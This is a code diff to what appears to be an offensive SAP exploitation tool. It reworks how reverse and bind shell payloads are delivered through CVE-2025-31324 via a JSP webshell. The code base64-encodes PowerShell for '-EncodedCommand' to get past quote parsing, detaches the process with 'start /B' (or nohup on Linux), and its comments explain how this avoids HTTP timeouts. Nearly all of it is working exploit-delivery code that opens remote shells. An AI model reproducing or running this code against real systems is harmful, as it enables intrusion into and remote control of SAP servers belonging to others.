@@ -535,6 +535,10 @@ def _win_multistep_payload(ps_script: str, display: str) -> dict:
         "sxpg_steps": sxpg_steps,
         "sxpg_command": "cmd.exe",          # detached launch via start /B
         "sxpg_params": sxpg_final_params,
+        # Raw PowerShell source — for backends (CVE-2025-31324 via JSP shell)
+        # that don't have the 128/255-byte EXTPROG/PARAMS limits and can run
+        # the script directly in one shot, skipping the chunked base64 write.
+        "raw_ps_script": ps_script,
         "display": display,
     }
 
@@ -2043,32 +2047,46 @@ def create_app(api: SAPMAPApi) -> Bottle:
                     node, payload["command"], payload["params"],
                     long_params=payload.get("long_params"))
             elif method == "cve_31324":
-                # CVE-2025-31324: Runtime.exec(String) whitespace-tokenises and
-                # breaks `powershell -c "<complex script>"`.  Route through the
-                # JSP webshell so cmd.exe does the shell parsing.  via_shell()
-                # auto-drops a shell on first use if none exists.
-                pre_steps = payload.get("steps", [])
-                if pre_steps:
-                    total = len(pre_steps)
-                    for idx, step in enumerate(pre_steps):
-                        if _session_ref.cancelled:
-                            print(f"[*] {sid}: Payload delivery cancelled")
-                            return
-                        _set_progress(
-                            f"Writing payload chunk {idx+1}/{total}...")
-                        full_cmd = (step["command"] + " " + step["params"]).strip()
-                        sapmap_exploit.execute_cve_2025_31324_via_shell(
-                            node, full_cmd)
-                _set_progress("Executing payload...")
-                full_cmd = (payload["command"] + " " + payload["params"]).strip()
-                # For bind shell: the execute step blocks until the socket is
-                # accepted.  The JSP shell would hold the HTTP connection open
-                # the whole time, preventing the caller from proceeding to
-                # start_connector.  Launch detached via `start /B`.
-                if shell_mode == "bind":
-                    full_cmd = f"cmd.exe /C start /B {full_cmd}"
-                result = sapmap_exploit.execute_cve_2025_31324_via_shell(
-                    node, full_cmd)
+                # CVE-2025-31324 via the JSP shell has no 128/255-byte
+                # EXTPROG/PARAMS limits, so we skip the chunked base64 write
+                # used by the GW/SXPG backends and run the raw PowerShell in
+                # one shot.  That's one HTTP round trip instead of ~20, and
+                # each round trip spawns cmd.exe → PowerShell which is slow
+                # (500ms+) so chunked delivery easily blew past the 20s HTTP
+                # timeout.
+                raw_ps = payload.get("raw_ps_script")
+                if raw_ps:
+                    _set_progress("Executing payload (single-shot)...")
+                    # Encode the PowerShell source as UTF-16LE base64 and
+                    # hand it to `-EncodedCommand` — this bypasses all
+                    # quote/escape parsing by cmd.exe and PowerShell alike,
+                    # which matters because the reverse/bind shell scripts
+                    # contain embedded single AND double quotes.
+                    #
+                    # `start /B` detaches the PowerShell process so the JSP
+                    # shell's Runtime.exec(cmd.exe /c ...) can exit and
+                    # return the HTTP response immediately, freeing up
+                    # shell_start to call start_connector (bind mode) or
+                    # accept the reverse connection on the listener.
+                    import base64 as _b64
+                    enc = _b64.b64encode(
+                        raw_ps.encode("utf-16-le")).decode("ascii")
+                    full_cmd = (f"start /B powershell.exe -NoProfile "
+                                f"-EncodedCommand {enc}")
+                    # 45s is generous — the command returns as soon as
+                    # `start` spawns the detached child, typically <1s.
+                    result = sapmap_exploit.execute_cve_2025_31324_via_shell(
+                        node, full_cmd, timeout=45.0)
+                else:
+                    # Non-Windows payload (Linux python3 one-liner) — no
+                    # chunking, just ship it.
+                    full_cmd = (payload["command"] + " " +
+                                payload["params"]).strip()
+                    if shell_mode == "bind":
+                        full_cmd = f"nohup {full_cmd} >/dev/null 2>&1 &"
+                    _set_progress("Executing payload (single-shot)...")
+                    result = sapmap_exploit.execute_cve_2025_31324_via_shell(
+                        node, full_cmd, timeout=45.0)
             else:
                 # SXPG: split EXTPROG + PARAMS
                 creds = node.best_credentials()
